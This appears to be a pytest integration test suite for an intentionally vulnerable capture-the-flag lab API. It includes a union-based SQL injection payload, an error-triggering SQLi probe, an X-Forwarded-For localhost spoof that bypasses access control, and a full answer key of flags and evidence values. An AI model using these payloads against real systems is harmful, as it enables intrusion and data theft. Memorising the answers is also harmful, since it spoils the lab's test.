"""Pruebas de integracion del API interna (contra el laboratorio en ejecucion)."""

import pytest
import requests

TIMEOUT = 10

PAYLOAD_SQLI = "' UNION SELECT level, flag, points::text FROM internal_flags -- "


def _get(base, path, **kwargs):
    return requests.get(f"{base}{path}", timeout=TIMEOUT, **kwargs)


def _post(base, path, payload):
    return requests.post(f"{base}{path}", json=payload, timeout=TIMEOUT)


def test_salud_y_raiz_api(base_url):
    resp = _get(base_url, "/api/health")
    assert resp.status_code == 200
    assert resp.json()["status"] == "ok"

    raiz = _get(base_url, "/api/")
    assert raiz.status_code == 200
    assert "endpoints" in raiz.json()


def test_filtra_token_de_build_en_cabecera(base_url):
    resp = _get(base_url, "/api/health")
    assert resp.headers.get("X-DevCore-Build") == "dc-api-2024.11-rc2"


def test_listado_de_proyectos(base_url):
    resp = _get(base_url, "/api/projects")
    assert resp.status_code == 200
    body = resp.json()
    assert body["count"] >= 5
    codigos = [p["code"] for p in body["results"]]
    assert "DCPM" in codigos


def test_detalle_de_proyecto_parametrizado(base_url):
    resp = _get(base_url, "/api/projects/1")
    assert resp.status_code == 200
    assert resp.json()["id"] == 1

    ausente = _get(base_url, "/api/projects/9999")
    assert ausente.status_code == 404


def test_usuarios_ficticios_visibles(base_url):
    resp = _get(base_url, "/api/users")
    assert resp.status_code == 200
    usuarios = [u["username"] for u in resp.json()["results"]]
    assert "s.ostermann" in usuarios


def test_config_expuesta_con_secretos_senuelo(base_url):
    resp = _get(base_url, "/api/config")
    assert resp.status_code == 200
    claves = {c["key"]: c for c in resp.json()["results"]}
    assert claves["DEVCORE_API_KEY"]["is_secret"] is True
    assert claves["DEVCORE_API_KEY"]["value"] == "dc_live_9f4e2b7a6c8d1e3f5a7b9c2d4e6f8a0b"


def test_busqueda_normal(base_url):
    resp = _get(base_url, "/api/search", params={"q": "gestion"})
    assert resp.status_code == 200
    assert resp.json()["count"] >= 1


def test_busqueda_sin_parametro(base_url):
    resp = _get(base_url, "/api/search")
    assert resp.status_code == 400


def test_sqli_union_based_obtiene_flag_nivel_5(base_url):
    resp = _get(base_url, "/api/search", params={"q": PAYLOAD_SQLI})
    assert resp.status_code == 200
    resultados = resp.json()["results"]
    flags = [r["name"] for r in resultados]
    assert "FLAG{DATABASE_COMPROMISED}" in flags


def test_sqli_es_reflejada_en_el_error(base_url):
    resp = _get(base_url, "/api/search", params={"q": "' ORDER BY 999 -- "})
    assert resp.status_code == 500
    assert "query" in resp.json()


def test_recon_report_requiere_xff_local(base_url):
    sin_xff = _get(base_url, "/api/internal/recon-report")
    assert sin_xff.status_code == 403

    con_xff = _get(
        base_url,
        "/api/internal/recon-report",
        headers={"X-Forwarded-For": "127.0.0.1"},
    )
    assert con_xff.status_code == 200
    assert con_xff.json()["internal"] is True


def test_validacion_de_flag_invalida(base_url):
    resp = _post(base_url, "/api/flags/validate", {"flag": "FLAG{NO_EXISTE}"})
    assert resp.status_code == 404
    assert resp.json()["valid"] is False


def test_desbloqueo_por_evidencia_y_validacion(base_url):
    _post(base_url, "/api/flags/reset", {})

    mal = _post(base_url, "/api/flags/unlock", {"level": 1, "evidence": "incorrecta"})
    assert mal.status_code == 403

    bien = _post(
        base_url,
        "/api/flags/unlock",
        {"level": 1, "evidence": "dc-api-2024.11-rc2"},
    )
    assert bien.status_code == 200
    flag = bien.json()["flag"]
    assert flag == "FLAG{RECON_COMPLETE}"

    validada = _post(base_url, "/api/flags/validate", {"flag": flag})
    assert validada.status_code == 200
    assert validada.json()["valid"] is True
    assert validada.json()["level"] == 1


def test_progreso_y_flag_final(base_url):
    _post(base_url, "/api/flags/reset", {})

    flags = []
    evidencias = {
        1: "dc-api-2024.11-rc2",
        2: "devcore_archive_20241031.tar.gz",
        3: "s.ostermann",
        4: "dc_live_9f4e2b7a6c8d1e3f5a7b9c2d4e6f8a0b",
    }
    for nivel in range(1, 5):
        resp = _post(
            base_url, "/api/flags/unlock", {"level": nivel, "evidence": evidencias[nivel]}
        )
        assert resp.status_code == 200, resp.text
        flags.append(resp.json()["flag"])

    nivel5 = _get(base_url, "/api/search", params={"q": PAYLOAD_SQLI}).json()["results"]
    flag5 = [r["name"] for r in nivel5 if r["name"].startswith("FLAG{")][0]
    flags.append(flag5)

    validada5 = _post(base_url, "/api/flags/validate", {"flag": flag5})
    assert validada5.status_code == 200
    assert validada5.json()["level"] == 5

    final = _post(base_url, "/api/flags/unlock", {"level": 6, "flags": flags})
    assert final.status_code == 200
    assert final.json()["flag"] == "FLAG{DEVELOPER_SECRETS_ROOT}"

    progreso = _get(base_url, "/api/flags/progress").json()
    assert progreso["solved"] == [1, 2, 3, 4, 5, 6]
    assert progreso["score"] == 170

    _post(base_url, "/api/flags/reset", {})
